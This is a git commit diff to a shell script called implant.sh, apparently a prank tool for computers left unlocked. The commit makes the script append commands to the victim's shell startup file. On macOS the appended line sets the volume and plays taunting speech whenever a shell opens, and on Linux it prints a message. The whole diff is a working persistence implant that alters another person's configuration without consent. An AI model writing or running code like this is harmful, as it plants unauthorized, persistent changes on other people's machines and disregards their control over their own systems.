701062d0355db044945eb317d64136feb4f6a02c
auraltension <auraltension@riseup.net>
2015-03-13 14:41:43 +1100

    append shellrc

--- implant.sh
+++ implant.sh
@@ -3,12 +3,9 @@
 PWN_SHELL=$(echo $0 | awk -F "[/|-]" '{print $NF}')
 
 if [ "$(uname)" == "Darwin" ]; then
-  echo 'osascript -e "set volume 5"; say -v Whisper "You left me unlocked so I snuck in. powned."; say -v Hysterical "mwa ha ha ha ha ha haaa"'
-  echo $PWN_SHELL
+  echo 'osascript -e "set volume 5"; say -v Whisper "You left me unlocked so I snuck in. powned."; say -v Hysterical "mwa ha ha ha ha ha haaa"' >> ${HOME}/.${PWN_SHELL}rc
 elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
-  echo "got off lucky!"
-  echo $PWN_SHELL
+  echo 'echo "Got off lucky!"' >> ${HOME}/.${PWN_SHELL}rc
 else
   echo "You got off lucky!. Remember to lock your pc."
-  echo $PWN_SHELL
 fi
